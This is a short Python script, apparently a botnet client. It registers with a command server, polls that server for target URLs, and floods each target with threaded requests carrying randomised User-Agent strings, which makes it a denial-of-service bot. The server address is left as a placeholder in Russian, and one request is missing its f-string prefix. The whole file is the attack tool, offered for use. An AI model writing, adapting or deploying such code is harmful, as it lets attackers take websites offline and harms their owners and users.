import requests
import ua_generator
import threading

server_url = "ВАШ URL БОТНЕТ СЕРВЕР"

reg = requests.get("{server_url}/register")

def worker(response):
    for i in range(5):
        headers = {
            "User-Agent": ua_generator.generate().text
        }

        response_att = requests.get(response, headers=headers)

while True:
    response = requests.get(f"{server_url}/check").text
    if response != "none":
        t = threading.Thread(target=worker, args=(response,))
        t1 = threading.Thread(target=worker, args=(response,))
        t2 = threading.Thread(target=worker, args=(response,))
        t3 = threading.Thread(target=worker, args=(response,))
        t4 = threading.Thread(target=worker, args=(response,))

        t.start()
        t1.start()
        t2.start()
        t3.start()
        t4.start()

        t.join()
        t1.join()
        t2.join()
        t3.join()
        t4.join()
